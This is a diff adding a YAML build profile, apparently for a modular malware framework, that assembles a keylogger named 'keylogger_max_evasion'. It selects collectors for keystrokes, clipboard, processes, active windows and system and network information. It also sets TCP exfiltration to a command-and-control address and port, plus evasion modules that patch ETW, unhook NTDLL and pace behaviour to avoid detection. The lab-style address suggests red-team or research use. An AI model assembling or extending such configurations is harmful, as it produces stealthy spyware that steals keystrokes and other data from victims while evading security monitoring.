@@ -1,0 +1,29 @@
+name: keylogger_max_evasion
+description: Maximum evasion keylogger — ETW patch, NTDLL unhook, API-only, behavioral pacing
+
+core:
+  - core/emit_buffer
+
+collectors:
+  - collectors/system_info_api
+  - collectors/processes
+  - collectors/clipboard
+  - collectors/netinfo_api
+  - collectors/active_windows
+
+keylogger: collectors/keylogger_poll
+
+exfil: exfil/tcp_flush
+arch: arch/keylogger
+
+evasion:
+  - evasion/etw_patch
+  - evasion/unhook_ntdll
+  - evasion/behavioral_pacing
+  - evasion/sleep_jitter
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  FLUSH_INTERVAL_MS: "30000"
+  BATCH_DURATION_MS: "30000"
